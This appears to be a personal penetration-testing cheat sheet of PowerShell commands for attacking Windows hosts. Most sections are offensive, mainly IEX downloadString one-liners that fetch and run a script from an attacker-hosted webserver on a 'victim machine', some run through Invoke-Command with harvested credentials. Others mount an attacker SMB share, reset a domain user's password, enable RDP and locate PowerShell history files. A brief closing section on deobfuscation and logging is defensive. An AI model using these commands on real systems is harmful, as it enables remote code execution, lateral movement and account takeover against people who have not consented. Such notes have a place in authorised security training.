## Powershell on linux

- install `powershell-bin`
- `pwsh`

---

## Switch user

```
$user = hostname\\user
$pass = ConvertTo-SecureString '<password>' -Asplain -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $pass)
```

### In a new session

`New-PSSession -Credential $cred | Enter-PSSession`
or
`Start-Process powershell.exe -Credential $creds -NoNewWindow`

### To launch :

- a script from a ps1 on a webserver : `invoke-command -Computer \<hostname\> -Credential $cred -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http...ps1') }`
- a command : `Invoke-Command -ComputerName host -Credential $cred -Scriptblock {whoami}`

- If it doesn't work, modify the cred part. Use `crackmapexec` to see which user it uses (like \\host\user or else) and use this.

---

## Sharing folder on most up to date windows with SMB

- on attacking machine

`smbserver SHARE $(pwd) -smb2support -user <user> -password <password> (could be a new user)`

- on victim machine

```
$pass = convertto-securestring 'password' -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential('user', $pass)

New-PSDrive -Name user -PSProvider Filesystem -Credential $cred -Root \\ip\share
```

---

## Powershell history

`C:\Users\<user>\appdata\roaming\microsoft\windows\powershell\PSReadLine\`

---

## Change password of a domain user

`net user <user> <new_password>`

---

## Enable RDP

` Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0`
- Enable through firewall (may be optionnal) : `Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`

---

## Execute file hosted on attacking machine on the victim machine :

- powershell "IEX(New-Object Net.WebClient).downloadString('http....')"


---

## Powershell deobfuscate

- Read the file if possible
- see if it's a cmd or powershell command, launch it in the good shell (in a sandbox !)
- Activate the GPO to see the logs : 

![d7b2d3c9463e93891d9f5d66925e7c64.png](../../_resources/09d78747ce2d4ba990c3174a77da5509.png)

- The request will then be readable in your folder specified in the gpo, or in the event viewer.

![0e1403f2d0ddfbe3f15f399d35910c1f.png](../../_resources/b837993e2a1d4044bce0582f7d5cf39c.png)


![e8df5a572cc4995fd43b38937b747c9d.png](../../_resources/99a3ca3e3dc6499a9c00c3dc4ccbb1e8.png)
